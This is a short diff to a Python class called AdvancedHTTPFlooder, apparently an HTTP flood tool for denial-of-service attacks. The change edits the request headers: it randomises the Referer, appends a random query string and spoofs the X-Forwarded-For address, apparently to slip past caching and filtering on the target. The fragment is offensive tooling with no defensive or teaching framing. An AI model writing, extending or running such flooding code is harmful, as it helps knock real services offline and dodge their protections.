@@ -70,7 +70,7 @@ class AdvancedHTTPFlooder:
                 f"https://www.google.com/search?q={self.generate_random_string()}",
                 f"https://{host}/",
                 f"https://example.com/{self.generate_random_string()}"
-            ]),
+            ])+f"/?q={buildblock(random.randint(3,8))}",
             "X-Forwarded-For": self.fake.ipv4(),
             "X-Request-ID": self.generate_random_string(16),
         }
